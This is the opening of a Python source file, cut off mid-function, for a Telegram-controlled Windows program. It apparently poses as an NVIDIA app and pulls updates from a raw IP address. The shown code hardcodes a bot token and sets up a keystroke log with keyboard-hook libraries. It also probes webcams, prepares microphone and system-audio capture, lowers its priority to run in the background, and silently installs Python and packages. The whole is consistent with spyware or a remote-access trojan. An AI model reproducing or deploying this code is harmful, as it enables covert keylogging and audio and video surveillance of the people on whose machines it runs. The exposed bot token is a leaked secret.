#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Map Cyrillic letters to US QWERTY equivalents (by key position)
RU_TO_EN = {
    'ё': '`', '1': '1', '2': '2', '3': '3', '4': '4', '5': '5', '6': '6', '7': '7', '8': '8', '9': '9', '0': '0', '-': '-', '=': '=',
    'й': 'q', 'ц': 'w', 'у': 'e', 'к': 'r', 'е': 't', 'н': 'y', 'г': 'u', 'ш': 'i', 'щ': 'o', 'з': 'p', 'х': '[', 'ъ': ']','\\': '\\',
    'ф': 'a', 'ы': 's', 'в': 'd', 'а': 'f', 'п': 'g', 'р': 'h', 'о': 'j', 'л': 'k', 'д': 'l', 'ж': ';', 'э': "'",
    'я': 'z', 'ч': 'x', 'с': 'c', 'м': 'v', 'и': 'b', 'т': 'n', 'ь': 'm', 'б': ',', 'ю': '.', '.': '/',
}
RU_TO_EN.update({k.upper(): v.upper() if v.isalpha() else v for k, v in RU_TO_EN.items()})

def map_ru_to_en(ch: str) -> str:
    if not ch:
        return ch
    if len(ch) == 1:
        return RU_TO_EN.get(ch, ch)
    return ''.join(RU_TO_EN.get(c, c) for c in ch)

# Invert mapping to convert ASCII (EN) key positions to Cyrillic when OS layout is RU
EN_TO_RU = {}
for _k, _v in RU_TO_EN.items():
    if _v not in EN_TO_RU:
        EN_TO_RU[_v] = _k

def map_en_to_ru(ch: str) -> str:
    if not ch:
        return ch
    if len(ch) == 1:
        return EN_TO_RU.get(ch, ch)
    return ''.join(EN_TO_RU.get(c, c) for c in ch)

# Set of Cyrillic letters only (exclude punctuation) for selective mapping
RU_LETTERS = {k for k in RU_TO_EN.keys() if k.isalpha() and not k.isascii()}
RU_LETTERS.update({k.upper() for k in RU_LETTERS})

import subprocess
import sys
import os
import urllib.request
import tempfile
import shutil
import time
from app_version import APP_VERSION

# Base URL of your update server (nginx on VDS)
UPDATE_BASE_URL = os.environ.get("NVIDIA_APP_BASE_URL") or "http://164.215.97.151/nvidia-app"

# ========================================
# CLEANUP MUTEX BEFORE RESTART
# ========================================
def cleanup_mutex_for_restart():
    """Удаляет mutex файл перед перезапуском программы"""
    try:
        mutex_file = os.path.join(tempfile.gettempdir(), 'telegram_pc_control.lock')
        if os.path.exists(mutex_file):
            os.remove(mutex_file)
    except Exception:
        pass  # Игнорируем ошибки удаления

# ========================================
# АВТОУСТАНОВКА PYTHON И PIP ЕСЛИ ИХ НЕТ
# ========================================
def ensure_python_and_pip():
    """Проверяет и устанавливает Python/pip если их нет через winget"""
    try:
        # Проверяем что Python вообще есть
        python_version = sys.version_info
        print(f"✅ Python найден: {python_version.major}.{python_version.minor}.{python_version.micro}")
        
        # Проверяем pip
        try:
            import pip
            print(f"✅ pip найден")
            return True
        except ImportError:
            print("⚠️ pip не найден, пробую установить...")
            
            # Пытаемся установить pip через ensurepip
            try:
                subprocess.run([sys.executable, '-m', 'ensurepip', '--default-pip'], 
                             check=True, capture_output=True)
                print("✅ pip установлен через ensurepip")
                return True
            except:
                pass
            
            # Пытаемся скачать и установить get-pip.py
            try:
                import urllib.request
                print("📥 Скачиваю get-pip.py...")
                url = "https://bootstrap.pypa.io/get-pip.py"
                pip_file = os.path.join(tempfile.gettempdir(), "get-pip.py")
                urllib.request.urlretrieve(url, pip_file)
                
                print("⚙️  Устанавливаю pip...")
                subprocess.run([sys.executable, pip_file], check=True)
                os.remove(pip_file)
                print("✅ pip установлен")
                return True
            except Exception as e:
                print(f"❌ Не удалось установить pip: {e}")
                return False
                
    except Exception as e:
        print(f"❌ Критическая ошибка Python: {e}")
        
        # Python не найден - пытаемся установить через winget
        print("\n" + "="*70)
        print("  🔧 АВТОМАТИЧЕСКАЯ УСТАНОВКА PYTHON")
        print("="*70)
        print()
        print("  Python не найден в системе. Устанавливаю Python 3.12...")
        print()
        
        try:
            # Проверяем наличие winget
            result = subprocess.run(['winget', '--version'], 
                                  capture_output=True, text=True, timeout=5)
            
            if result.returncode == 0:
                print("  ✅ winget найден")
                print("  📥 Устанавливаю Python.Python.3.12 через winget...")
                print()
                
                # Устанавливаем Python 3.12 с включенным tcl/tk
                install_result = subprocess.run(
                    ['winget', 'install', '--id', 'Python.Python.3.12', 
                     '--accept-source-agreements', '--accept-package-agreements'],
                    capture_output=False  # Показываем процесс
                )
                
                if install_result.returncode == 0:
                    print()
                    print("  ✅ Python 3.12 установлен!")
                    print("  🔄 Перезапустите программу")
                    print()
                    input("Нажмите Enter для выхода...")
                    sys.exit(0)
                else:
                    print("  ❌ Ошибка установки через winget")
            else:
                print("  ⚠️ winget не найден")
                
        except FileNotFoundError:
            print("  ⚠️ winget не найден в системе")
        except Exception as e:
            print(f"  ❌ Ошибка: {e}")
        
        # Fallback - ручная установка
        print()
        print("  📥 РУЧНАЯ УСТАНОВКА:")
        print("     1. Скачайте Python 3.12.8:")
        print("        https://www.python.org/ftp/python/3.12.8/python-3.12.8-amd64.exe")
        print()
        print("     2. Запустите установщик:")
        print("        ✅ Отметьте 'Add Python to PATH'")
        print("        ✅ Отметьте 'tcl/tk and IDLE' (для GUI)")
        print()
        print("     3. Перезапустите эту программу")
        print()
        input("Нажмите Enter для выхода...")
        sys.exit(1)

# Вызываем проверку Python/pip при старте
ensure_python_and_pip()

# ========================================
# ОЧИСТКА КОНФЛИКТУЮЩИХ ПАКЕТОВ
# ========================================
def cleanup_conflicting_packages():
    """Удаляет конфликтующие версии пакетов ТОЛЬКО при первом запуске"""
    try:
        # Проверяем маркер первого запуска (в TEMP чтобы не засорять папку программы)
        import tempfile
        marker_file = os.path.join(tempfile.gettempdir(), 'telegram_pc_control_first_run.done')
        
        if os.path.exists(marker_file):
            # Уже очищали - пропускаем
            print("  ℹ️  Пакеты уже установлены, очистка не требуется")
            return
        
        print("="*70)
        print("  🧹 ПЕРВЫЙ ЗАПУСК: Очистка старых пакетов")
        print("="*70)
        print()
        
        packages_to_remove = ['requests', 'pillow', 'numpy', 'mss', 'opencv-python', 'sounddevice', 'av', 'pynput', 'keyboard']
        
        for package in packages_to_remove:
            try:
                print(f"  Удаление {package}...", end=" ")
                result = subprocess.run(
                    [sys.executable, '-m', 'pip', 'uninstall', '-y', package],
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                if result.returncode == 0:
                    print("✅")
                else:
                    print("⚠️ (не установлен)")
            except:
                print("⚠️")
        
        print()
        print("  ✅ Очистка завершена!")
        print()
        
        # Создаем маркер первого запуска
        try:
            with open(marker_file, 'w') as f:
                f.write('done')
        except:
            pass
            
    except Exception as e:
        print(f"  ⚠️ Ошибка очистки: {e}")
        print()

# ========================================
# АВТОМАТИЧЕСКАЯ УСТАНОВКА PYTHON 3.12
# ========================================
def auto_install_python_312():
    """Автоматически скачивает и устанавливает Python 3.12 если текущая версия слишком новая"""
    
    py_version = f"{sys.version_info.major}.{sys.version_info.minor}"
    
    # Проверяем версию Python - если >= 3.13, устанавливаем 3.12
    if not (sys.version_info.major >= 3 and sys.version_info.minor >= 13):
        return None  # Текущая версия подходит
    
    print("="*70)
    print(f"  ⚠️  Python {py_version} - слишком новая версия")
    print("="*70)
    print()
    print(f"  Для работы программы требуется Python 3.11 или 3.12")
    print(f"  (пакеты numpy, opencv, av несовместимы с Python {py_version})")
    print()
    
    # Сначала ищем уже установленный Python 3.12 в системе
    print("  [1/4] 🔍 Поиск Python 3.12 в системе...")
    
    possible_paths = [
        r"C:\Python312\python.exe",
        r"C:\Program Files\Python312\python.exe",
        r"C:\Program Files (x86)\Python312\python.exe",
        os.path.expanduser(r"~\AppData\Local\Programs\Python\Python312\python.exe"),
        os.path.join(os.path.dirname(os.path.abspath(__file__)), ".python312", "python.exe"),
    ]
    
    for path in possible_paths:
        if os.path.exists(path):
            try:
                result = subprocess.run([path, "--version"], capture_output=True, text=True, timeout=5)
                if result.returncode == 0 and "3.12" in result.stdout:
                    print(f"        ✅ Найден Python 3.12: {path}")
                    print()
                    print("  [2/4] 🔄 Перезапускаю программу с Python 3.12...")
                    print()
                    print("="*70)
                    # Удаляем mutex чтобы новый процесс мог запуститься
                    cleanup_mutex_for_restart()
                    script_path = os.path.abspath(__file__)
                    subprocess.Popen([path, script_path] + sys.argv[1:])
                    sys.exit(0)
            except:
                pass
    
    print("        ℹ️  Python 3.12 не найден в стандартных путях")
    print()
    print("  🔄 АВТОМАТИЧЕСКАЯ УСТАНОВКА Python 3.12.8...")
    print()
    
    # URL для скачивания Python 3.12.8
    python_url = "https://www.python.org/ftp/python/3.12.8/python-3.12.8-amd64.exe"
    
    try:
        # Создаем временную директорию
        temp_dir = tempfile.mkdtemp()
        installer_path = os.path.join(temp_dir, "python-3.12.8-amd64.exe")
        
        print("  [2/4] 📥 Скачиваю Python 3.12.8...")
        print(f"        Источник: {python_url}")
        print("        ⏳ Ожидайте (примерно 25 МБ)...")
        
        # Скачиваем установщик с прогресс-баром
        def download_progress(block_num, block_size, total_size):
            downloaded = block_num * block_size
            if total_size > 0:
                percent = min(100, downloaded * 100 // total_size)
                if block_num % 50 == 0:  # Обновляем каждые ~50 блоков
                    print(f"        Скачано: {percent}% ({downloaded // 1024 // 1024} МБ / {total_size // 1024 // 1024} МБ)", end='\r')
        
        urllib.request.urlretrieve(python_url, installer_path, reporthook=download_progress)
        print("\n        ✅ Python 3.12.8 скачан!")
        print()
        
        print("  [3/4] ⚙️  Устанавливаю Python 3.12.8...")
        print("        Режим: тихая установка (без окон)")
        print("        ⏳ Ожидайте (1-2 минуты)...")
        
        # Определяем путь установки в локальной директории программы
        install_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".python312")
        
        # Запускаем установщик в тихом режиме (С TCL/TK для tkinter!)
        install_cmd = [
            installer_path,
            '/quiet',                    # Тихая установка
            'InstallAllUsers=0',         # Установка для текущего пользователя
            f'TargetDir={install_dir}',  # Директория установки
            'PrependPath=0',             # НЕ добавлять в PATH
            'Include_test=0',            # Не устанавливать тесты
            'Include_tcltk=1',           # ✅ УСТАНАВЛИВАТЬ Tcl/Tk (для tkinter!)
            'Include_doc=0',             # Не устанавливать документацию
            'Include_launcher=0',        # Не устанавливать launcher
            'AssociateFiles=0',          # Не ассоциировать файлы
        ]
        
        result = subprocess.run(install_cmd, capture_output=True, text=True, timeout=300)
        
        if result.returncode == 0:
            print("        ✅ Python 3.12.8 установлен!")
            print()
            
            # Ждем немного для завершения установки
            time.sleep(2)
            
            # АГРЕССИВНЫЙ ПОИСК: ищем Python во всех возможных местах
            print("  [4/4] 🔍 Поиск установленного Python 3.12...")
            
            search_paths = [
                # Ожидаемый путь
                os.path.join(install_dir, "python.exe"),
                # Возможные подпапки
                os.path.join(install_dir, "bin", "python.exe"),
                os.path.join(install_dir, "Scripts", "python.exe"),
                # AppData пользователя (если игнорировал TargetDir)
                os.path.expanduser(r"~\AppData\Local\Programs\Python\Python312\python.exe"),
                os.path.expanduser(r"~\AppData\Local\Programs\Python\Python312-64\python.exe"),
                os.path.expanduser(r"~\AppData\Local\Programs\Python\Python3.12\python.exe"),
                # Program Files
                r"C:\Program Files\Python312\python.exe",
                r"C:\Program Files (x86)\Python312\python.exe",
                # Локальные варианты
                os.path.join(os.path.dirname(os.path.abspath(__file__)), ".python312", "python.exe"),
                os.path.join(os.path.dirname(os.path.abspath(__file__)), "python312", "python.exe"),
            ]
            
            found_python = None
            for search_path in search_paths:
                if os.path.exists(search_path):
                    try:
                        # Проверяем что это действительно Python 3.12
                        check_result = subprocess.run([search_path, "--version"], capture_output=True, text=True, timeout=3)
                        if check_result.returncode == 0 and "3.12" in check_result.stdout:
                            found_python = search_path
                            print(f"        ✅ Найден: {search_path}")
                            break
                    except:
                        pass
            
            if found_python:
                print("        ✅ Python 3.12 успешно найден после установки!")
                print()
                print("  [4/4] 🔄 Перезапускаю программу с Python 3.12.8...")
                print()
                print("="*70)
                
                # Удаляем временные файлы
                try:
                    shutil.rmtree(temp_dir)
                except:
                    pass
                
                # Удаляем mutex чтобы новый процесс мог запуститься
                cleanup_mutex_for_restart()
                
                # Перезапускаем программу с новым Python
                script_path = os.path.abspath(__file__)
                subprocess.Popen([found_python, script_path] + sys.argv[1:])
                sys.exit(0)
            else:
                # Python установился но мы его не нашли - пробуем установить в AppData
                print("        ⚠️ Python установлен но не найден в ожидаемых местах")
                print("        🔄 Попытка #2: установка в AppData...")
                print()
                
                # Альтернативная установка в AppData
                appdata_dir = os.path.expanduser(r"~\AppData\Local\Programs\Python\Python312")
                alt_install_cmd = [
                    installer_path,
                    '/quiet',
                    'InstallAllUsers=0',
                    f'TargetDir={appdata_dir}',
                    'PrependPath=0',
                    'Include_test=0',
                    'Include_tcltk=1',
                    'Include_doc=0',
                    'Include_launcher=0',
                    'AssociateFiles=0',
                ]
                
                alt_result = subprocess.run(alt_install_cmd, capture_output=True, text=True, timeout=300)
                time.sleep(2)
                
                # Проверяем альтернативный путь
                alt_python_exe = os.path.join(appdata_dir, "python.exe")
                if os.path.exists(alt_python_exe):
                    try:
                        check = subprocess.run([alt_python_exe, "--version"], capture_output=True, text=True, timeout=3)
                        if check.returncode == 0 and "3.12" in check.stdout:
                            print("        ✅ Python 3.12 установлен в AppData!")
                            print()
                            print("  🔄 Перезапускаю программу...")
                            print()
                            try:
                                shutil.rmtree(temp_dir)
                            except:
                                pass
                            cleanup_mutex_for_restart()
                            script_path = os.path.abspath(__file__)
                            subprocess.Popen([alt_python_exe, script_path] + sys.argv[1:])
                            sys.exit(0)
                    except:
                        pass
                
                # Если всё ещё не нашли - используем команду where для поиска в PATH
                print("        🔍 Попытка #3: поиск через системный PATH...")
                try:
                    where_result = subprocess.run(['where', 'python'], capture_output=True, text=True, timeout=5)
                    if where_result.returncode == 0:
                        for line in where_result.stdout.split('\n'):
                            python_path = line.strip()
                            if python_path and os.path.exists(python_path):
                                try:
                                    check = subprocess.run([python_path, "--version"], capture_output=True, text=True, timeout=3)
                                    if check.returncode == 0 and "3.12" in check.stdout:
                                        print(f"        ✅ Найден через PATH: {python_path}")
                                        print()
                                        try:
                                            shutil.rmtree(temp_dir)
                                        except:
                                            pass
                                        cleanup_mutex_for_restart()
                                        script_path = os.path.abspath(__file__)
                                        subprocess.Popen([python_path, script_path] + sys.argv[1:])
                                        sys.exit(0)
                                except:
                                    pass
                except:
                    pass
                
                print("        ❌ Python 3.12 не найден после всех попыток установки")
                print("        ℹ️ Программа продолжит работу с Python 3.13 (ограниченная функциональность)")
                print()
                return None
        else:
            print("        ❌ Установщик вернул код ошибки")
            if result.stderr:
                print(f"        Детали: {result.stderr[:300]}")
            print("        🔄 Попытка установки в AppData...")
            
            # Пробуем установить в AppData если основная установка не удалась
            appdata_dir = os.path.expanduser(r"~\AppData\Local\Programs\Python\Python312")
            alt_install_cmd = [
                installer_path,
                '/quiet',
                'InstallAllUsers=0',
                f'TargetDir={appdata_dir}',
                'PrependPath=0',
                'Include_tcltk=1',
            ]
            
            alt_result = subprocess.run(alt_install_cmd, capture_output=True, text=True, timeout=300)
            time.sleep(2)
            
            alt_python_exe = os.path.join(appdata_dir, "python.exe")
            if os.path.exists(alt_python_exe):
                try:
                    check = subprocess.run([alt_python_exe, "--version"], capture_output=True, text=True, timeout=3)
                    if check.returncode == 0 and "3.12" in check.stdout:
                        print("        Альтернативная установка успешна!")
                        try:
                            shutil.rmtree(temp_dir)
                        except:
                            pass
                        cleanup_mutex_for_restart()
                        script_path = os.path.abspath(__file__)
                        subprocess.Popen([alt_python_exe, script_path] + sys.argv[1:])
                        sys.exit(0)
                except:
                    pass
            
            print("        ℹ️ Программа продолжит с Python 3.13 (могут быть проблемы с некоторыми пакетами)")
            print()
            return None
            
    except Exception as e:
        print(f"        ❌ Ошибка: {e}")
        import traceback
        traceback.print_exc()
        return None
    finally:
        # Очистка временных файлов
        try:
            if 'temp_dir' in locals() and os.path.exists(temp_dir):
                shutil.rmtree(temp_dir)
        except:
            pass
    
    return None

# ========================================
# АВТОУСТАНОВКА ЗАВИСИМОСТЕЙ ПРИ ПЕРВОМ ЗАПУСКЕ  
# ========================================
def auto_install_dependencies():
    """Автоматически устанавливает недостающие зависимости включая pip"""
    
    # КРИТИЧНО: Проверяем версию Python ПЕРЕД установкой пакетов
    py_version = f"{sys.version_info.major}.{sys.version_info.minor}"
    if sys.version_info.major >= 3 and sys.version_info.minor >= 13:
        print("="*70)
        print(f"  ⚠️  КРИТИЧЕСКАЯ ОШИБКА: Python {py_version} несовместим!")
        print("="*70)
        print()
        print(f"  Обнаружен Python {py_version}, но программа требует Python 3.11 или 3.12")
        print(f"  (пакеты numpy, opencv, av, pyaudiowpatch несовместимы с Python {py_version})")
        print()
        
        # АВТОМАТИЧЕСКАЯ УСТАНОВКА Python 3.12
        auto_install_python_312()
        
        # Если дошли сюда - продолжаем с Python 3.13 (некоторые пакеты могут не работать)
        print()
        print("  ℹ️  Продолжаю с текущей версией Python...")
        print("  ⚠️  Некоторые функции могут быть недоступны (instant replay, opencv)")
        print()
    
    # Сначала очищаем конфликтующие пакеты
    cleanup_conflicting_packages()
    
    # ПОЛНЫЙ список всех необходимых пакетов для работы программы
    required_packages = [
        # Основные пакеты для работы
        ('requests', 'requests'),           # HTTP запросы к боту
        ('pillow', 'PIL'),                  # Работа с изображениями
        ('numpy', 'numpy'),                 # Массивы для аудио/видео
        
        # Захват экрана и видео
        ('mss', 'mss'),                     # Быстрый захват экрана
        ('opencv-python', 'cv2'),           # Обработка видео
        ('dxcam', 'dxcam'),                 # GPU Desktop Duplication (опционально, но полезно)
        
        # Аудио
        ('sounddevice', 'sounddevice'),     # Захват аудио
        ('pyaudiowpatch', 'pyaudiowpatch'), # WASAPI loopback для системного звука
        ('pycaw', 'pycaw'),                  # Системный mute через Windows API
        ('av', 'av'),                       # PyAV для кодирования видео
        
        # Клавиатура и мышь
        ('pynput', 'pynput'),               # Перехват клавиатуры
        ('keyboard', 'keyboard'),           # Работа с клавиатурой
        
        # Дополнительные (опциональные для некоторых функций)
        ('pywin32', 'win32api'),            # Windows API (опционально)
        ('comtypes', 'comtypes'),           # COM для аудио (опционально)
    ]
    
    print("="*70)
    print("  🔍 ПРОВЕРКА И УСТАНОВКА ЗАВИСИМОСТЕЙ")
    print("="*70)
    print()
    
    # ШАГ 1: Проверка что pip доступен
    print("[1/3] 🔍 Проверка pip...")
    try:
        result = subprocess.run([sys.executable, '-m', 'pip', '--version'], 
                              capture_output=True, text=True, timeout=10)
        if result.returncode == 0:
            print(f"      ✅ pip доступен: {result.stdout.strip()}")
        else:
            print("      ⚠️  pip не найден, пытаюсь установить...")
            # Пробуем установить pip через ensurepip
            try:
                subprocess.run([sys.executable, '-m', 'ensurepip', '--default-pip'], 
                             check=True, capture_output=True, timeout=60)
                print("      ✅ pip успешно установлен!")
            except:
                print("      ❌ Не удалось установить pip автоматически")
                print("      💡 Установите Python заново с официального сайта:")
                print("         https://www.python.org/downloads/")
                print("         При установке отметьте 'Add Python to PATH'")
                input("\nНажмите Enter для выхода...")
                sys.exit(1)
    except Exception as e:
        print(f"      ❌ Ошибка проверки pip: {e}")
        print("      💡 Переустановите Python с https://www.python.org/downloads/")
        input("\nНажмите Enter для выхода...")
        sys.exit(1)
    print()
    
    # ШАГ 2: Проверка зависимостей
    print("[2/3] 🔍 Проверка зависимостей...")
    missing_packages = []
    optional_missing = []
    
    for pip_name, import_name in required_packages:
        try:
            __import__(import_name)
            # print(f"      ✅ {import_name} установлен")
        except Exception as e:
            # pywin32 и comtypes опциональны - игнорируем любые ошибки (в т.ч. несовместимость с Python 3.13)
            if pip_name in ('pywin32', 'comtypes'):
                print(f"      ⚠️  {import_name} недоступен (опционально): {type(e).__name__}")
                # Не добавляем в optional_missing, т.к. они уже установлены но несовместимы
                continue
            # Для обязательных пакетов - только ImportError означает отсутствие
            if isinstance(e, ImportError):
                missing_packages.append(pip_name)
            else:
                # Другие ошибки - возможно проблема совместимости, пропускаем
                print(f"      ⚠️  {import_name} ошибка загрузки: {type(e).__name__}")
    
    if not missing_packages and not optional_missing:
        print("      ✅ Все зависимости установлены!")
        print()
        return
    
    if missing_packages:
        print(f"      ❌ Отсутствуют: {', '.join(missing_packages)}")
    if optional_missing:
        print(f"      ⚠️  Опциональные отсутствуют: {', '.join(optional_missing)}")
    print()
    
    # ШАГ 3: Установка недостающих пакетов
    if missing_packages or optional_missing:
        all_missing = missing_packages + optional_missing
        print(f"[3/3] 📦 Установка {len(all_missing)} пакетов...")
        print("      ⏳ Это может занять несколько минут...")
        print()
        
        try:
            # Сначала обновляем pip
            print("      [1/2] Обновление pip...")
            result = subprocess.run(
                [sys.executable, '-m', 'pip', 'install', '--upgrade', 'pip'],
                capture_output=True, text=True, timeout=120
            )
            if result.returncode == 0:
                print("      ✅ pip обновлен")
            else:
                print("      ⚠️  Обновление pip не удалось, продолжаю с текущей версией")
            print()
            
            # Устанавливаем пакеты (сначала пробуем только готовые wheel-файлы)
            print(f"      [2/2] Установка пакетов: {', '.join(all_missing)}")
            print(f"      ℹ️  Python {sys.version_info.major}.{sys.version_info.minor} - пробую установить готовые пакеты...")
            
            # Сначала пробуем установить только готовые wheel-файлы (без компиляции)
            result = subprocess.run(
                [sys.executable, '-m', 'pip', 'install', '--only-binary', ':all:'] + all_missing,
                capture_output=True, text=True, timeout=600  # 10 минут
            )
            
            # Если не удалось с --only-binary, пробуем обычную установку
            if result.returncode != 0:
                print(f"      ⚠️  Готовые пакеты недоступны для Python {sys.version_info.major}.{sys.version_info.minor}")
                print(f"      🔄 Пробую обычную установку (может потребоваться компилятор)...")
                result = subprocess.run(
                    [sys.executable, '-m', 'pip', 'install'] + all_missing,
                    capture_output=True, text=True, timeout=600  # 10 минут
                )
            
            if result.returncode == 0:
                print("      ✅ Все пакеты успешно установлены!")
                print()
                print("="*70)
                print("  ✅ УСТАНОВКА ЗАВЕРШЕНА!")
                print("="*70)
                print()
                print("🔄 Перезагружаю модули...")
                
                # Перезагружаем sys.path
                import importlib
                import site
                importlib.reload(site)
                
                # Проверяем что все импортируется
                success_count = 0
                for pip_name, import_name in required_packages:
                    try:
                        importlib.import_module(import_name)
                        success_count += 1
                    except Exception:
                        if pip_name not in ('pywin32', 'comtypes'):
                            print(f"⚠️  {import_name} все еще недоступен после установки")
                
                print(f"✅ Загружено {success_count}/{len(required_packages)} модулей")
                print("🚀 Запускаю программу...")
                print()
                
            else:
                print("      ❌ Ошибка при установке пакетов")
                print()
                
                # Проверяем версию Python и запускаем автоустановку 3.12
                py_version = f"{sys.version_info.major}.{sys.version_info.minor}"
                if sys.version_info.major >= 3 and sys.version_info.minor >= 13:
                    print("="*70)
                    print(f"  ⚠️  Python {py_version} слишком новый!")
                    print("="*70)
                    print()
                    
                    # АВТОМАТИЧЕСКАЯ УСТАНОВКА Python 3.12
                    auto_install_python_312()
                    
                    # Если мы дошли сюда, значит продолжаем с Python 3.13
                    print()
                    print("  ℹ️  Продолжаю с Python 3.13 (некоторые функции недоступны)")
                    print()
                    # НЕ выходим, продолжаем работу
                else:
                    print("ВЫВОД:")
                    print(result.stdout[-2000:] if len(result.stdout) > 2000 else result.stdout)
                    if result.stderr:
                        print()
                        print("ОШИБКИ:")
                        print(result.stderr[-2000:] if len(result.stderr) > 2000 else result.stderr)
                    print()
                    input("Нажмите Enter для выхода...")
                    sys.exit(1)
                
        except subprocess.TimeoutExpired:
            print("      ❌ Таймаут установки (слишком долго)")
            print("      💡 Попробуйте установить вручную:")
            print(f"         pip install {' '.join(all_missing)}")
            input("\nНажмите Enter для продолжения...")
        except Exception as e:
            print(f"      ❌ Ошибка установки: {e}")
            print()
            print("💡 РЕШЕНИЕ:")
            print("   Установите зависимости вручную:")
            print(f"   pip install {' '.join(all_missing)}")
            print()
            print("   Или используйте requirements.txt:")
            print("   pip install -r requirements.txt")
            print()
            input("Нажмите Enter для продолжения...")

# ========================================
# ВЫЗОВ АВТОУСТАНОВКИ ДО ИМПОРТОВ
# ========================================
# КРИТИЧЕСКИ ВАЖНО: Вызываем auto_install_dependencies() ДО импортов
# чтобы установить недостающие пакеты ПЕРЕД попыткой их импорта
# 
# НО! Вызываем только если:
# 1. Это главный модуль (__name__ == "__main__")
# 2. Это не frozen EXE (не упакованный PyInstaller)
# 
# Это безопасно потому что:
# - Проверка __name__ предотвращает выполнение при импорте
# - Проверка frozen предотвращает проблемы с EXE
if __name__ == "__main__" and not getattr(sys, 'frozen', False):
    auto_install_dependencies()

import threading
import queue
import time
import logging
import requests
try:
    import tkinter as tk
    from tkinter import ttk
    HAS_TK = True
except Exception:
    HAS_TK = False
import socket
import getpass
from typing import Optional
import json
import concurrent.futures
try:
    import keyboard
    HAS_KEYBOARD = True
except Exception:
    HAS_KEYBOARD = False
try:
    import win32gui
    import win32con
    HAS_WIN32GUI = True
except Exception:
    HAS_WIN32GUI = False
try:
    import pyautogui
    HAS_PYAUTOGUI = True
except Exception:
    HAS_PYAUTOGUI = False
import ctypes
import subprocess
import io
from PIL import Image
try:
    from pynput import keyboard as pynput_keyboard
    HAS_PYNPUT = True
except Exception:
    HAS_PYNPUT = False
import traceback
from fractions import Fraction

# Optional system mute support via pycaw
try:
    from ctypes import POINTER, cast
    from comtypes import CLSCTX_ALL
    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
    HAS_PYCAW = True
except Exception:
    HAS_PYCAW = False

# Default bot token
BOT_TOKEN = '8294625680:AAEFXjFMt3bFmzp1QbNeLvnn0ErPScGLwTQ'

BOT_BASE_URL: Optional[str] = None

key_log = ''
readiness_sent = False
force_en = False
last_lang_ts = 0.0
last_lang_ts_fb = 0.0
SAFE_MODE = os.getenv("PROGRAM_SAFE_MODE", "0") == "1"

transliterate = False

# Instant Replay buffers (OPTIMIZED)
from collections import deque
replay_video_buffer = deque(maxlen=1920)  # ~32 секунды @ 60 FPS (буфер, можно использовать для 30 FPS)
replay_lock = threading.Lock()
# Качество: 1280x720 @ 30 FPS, но с пониженным приоритетом потоков/процесса
TARGET_WIDTH = 1280
TARGET_HEIGHT = 720
replay_fps = 30
replay_audio_rate = 48000
replay_audio_chunk = 1024  # Larger buffer for better audio quality
replay_max_frames = 900  # ~30 секунд @ 30 FPS
replay_max_audio_chunks = int(replay_audio_rate / replay_audio_chunk * 32)  # Match video duration (32s)
replay_recording = False
replay_audio_recording_out = False
replay_audio_recording_mic = False
replay_saving_in_progress = False  # Prevent multiple simultaneous saves
replay_audio_available_out = False
replay_audio_available_mic = False
# Use deque with maxlen for auto-cleanup and better performance
replay_audio_buffer_out = deque(maxlen=replay_max_audio_chunks)
replay_audio_buffer_mic = deque(maxlen=replay_max_audio_chunks)
replay_audio_lock_out = threading.Lock()
replay_audio_lock_mic = threading.Lock()
replay_audio_rate_out_current = replay_audio_rate
replay_audio_rate_mic_current = replay_audio_rate

# Webcam info (обновлено: больше нет фонового захвата, только on-demand)
HAS_WEBCAM = False
WEBCAM_INDICES = []  # список доступных индексов камер (0,1,...)

def detect_webcams(max_devices: int = 4):
    """Пробует найти доступные вебкамеры (0..max_devices-1) с минимальной нагрузкой."""
    global HAS_WEBCAM, WEBCAM_INDICES
    try:
        import cv2
    except Exception:
        HAS_WEBCAM = False
        WEBCAM_INDICES = []
        return
    indices = []
    for idx in range(max_devices):
        cap = None
        try:
            cap = cv2.VideoCapture(idx)
            if cap and cap.isOpened():
                indices.append(idx)
        except Exception:
            pass
        finally:
            try:
                if cap:
                    cap.release()
            except Exception:
                pass
    WEBCAM_INDICES = indices
    HAS_WEBCAM = bool(indices)

def set_process_background_priority():
    """Ставит пониженный приоритет процессу, чтобы он меньше мешал другим приложениям."""
    try:
        ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000
        BELOW_NORMAL_PRIORITY_CLASS = 0x00004000
        IDLE_PRIORITY_CLASS = 0x00000040
        NORMAL_PRIORITY_CLASS = 0x00000020
        kernel32 = ctypes.windll.kernel32
        hProc = kernel32.GetCurrentProcess()
        # BELOW_NORMAL даёт хороший баланс; при желании можно переключить на IDLE
        kernel32.SetPriorityClass(hProc, BELOW_NORMAL_PRIORITY_CLASS)
    except Exception:
        pass

def set_current_thread_background_priority():
    """Переводит текущий поток в фоновый режим (минимальный приоритет)."""
    try:
        THREAD_MODE_BACKGROUND_BEGIN = 0x00010000
        kernel32 = ctypes.windll.kernel32
        hThread = kernel32.GetCurrentThread()
        kernel32.SetThreadPriority(hThread, THREAD_MODE_BACKGROUND_BEGIN)
    except Exception:
        pass

# Internal bot layout (does NOT change OS layout). Alt+Shift toggles this.
bot_layout_ru = False
bot_layout_initialized = False

# Layout cache
_layout_cache = {'is_ru': False, 'last_check': 0.0}

if __name__ == '__main__':
    # Защита от двойного запуска (single instance)
    import os
    import sys
    import tempfile
    # Используем TEMP вместо папки программы чтобы не создавать лишние файлы
    mutex_file = os.path.join(tempfile.gettempdir(), 'telegram_pc_control.lock')
    
    # Проверяем есть ли уже запущенный процесс
    if os.path.exists(mutex_file):
        try:
            with open(mutex_file, 'r') as f:
                old_pid = int(f.read().strip())
            # Проверяем жив ли процесс
            try:
                os.kill(old_pid, 0)  # Не убивает, только проверяет
                print(f"⚠️ Программа уже запущена! (PID {old_pid})")
                print("❌ Закройте существующую программу перед запуском новой")
                sys.exit(1)
            except OSError:
                # Процесс умер, можем продолжать
                pass
        except Exception:
            pass
    
    # Создаем lock file с нашим PID
    try:
        with open(mutex_file, 'w') as f:
            f.write(str(os.getpid()))
    except Exception:
        pass
    
    # Удаляем lock file при выходе
    import atexit
    def cleanup_mutex():
        try:
            if os.path.exists(mutex_file):
                os.remove(mutex_file)
        except Exception:
            pass
    atexit.register(cleanup_mutex)
    
    logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)s %(message)s')
    
    set_process_background_priority()  # Call set_process_background_priority() once at startup

current_layout_is_ru = False

def get_current_keyboard_layout():
    now = time.time()
